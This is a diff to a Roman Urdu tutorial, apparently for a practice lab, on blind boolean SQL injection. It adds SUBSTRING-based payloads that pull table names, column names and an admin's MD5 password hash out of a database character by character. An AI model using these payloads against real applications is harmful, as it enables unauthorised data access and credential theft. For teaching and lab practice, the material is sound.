@@ -170,10 +170,42 @@ Agar page pr koi change aye too matlab utni hi length hai.
 
 `1' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 1, 1) = 'g'#`
 
-Yeh payload aik sath 2 tables ka name btahe ga 
+LIMIT 0,1: Pehle table ke liye use hota hai.
 
-(LIMIT 0,1 pehly table ka name bataye ga, LIMIT 1,1 doosra table ka name bataye ga).
+​LIMIT 1,1: Doosre table ke liye use hota hai (jab pehla table complete nikal aaye).
 
+​SUBSTRING(..., 1, 1): Pehle table ka 1st character check karega.
+
+​SUBSTRING(..., 2, 1): Pehle table ka 2nd character check karega.
+
+### Columns Name Extract Karna
+​Table milne ke baad (e.g., users table), us ke columns check kiye jaate hain:
+
+`1' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1), 1, 1) = 'u'#`
+
+(Yahan hum match karte hain ke pehla column user hai ya password).
+
+**Agar password hai column ka naam too phir yeh payload**
+
+`1' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1), 1, 1) = 'p'#`
+
+---
+
+### Administrator ka Password Hash Extract Karna
+​Jab hume table (users) aur column (password) ka pata chal jata hai, toh hum Admin user ka MD5 password hash ek ek character karke extract karte hain:
+
+**Admin ke Password Hash ka Pehla Character Check:**
+
+`1' AND SUBSTRING((SELECT password FROM users WHERE user='admin'), 1, 1) = '5'#`
+
+If True: Admin hash ka pehla character 5 hai.
+​If False: Hum agla character (e.g., 2, a, b, 8) test karte hain.
+
+**Admin ke Password Hash ka Doosra Character Check:**
+
+`1' AND SUBSTRING((SELECT password FROM users WHERE user='admin'), 2, 1) = 'f'#`
+
+Isi tarah Loop chala kar poore 32-character MD5 Hash (e.g., 5f4dcc3b5aa765d61d8327deb882cf99) ki exact string nikal aati hai.
 
 ---
 
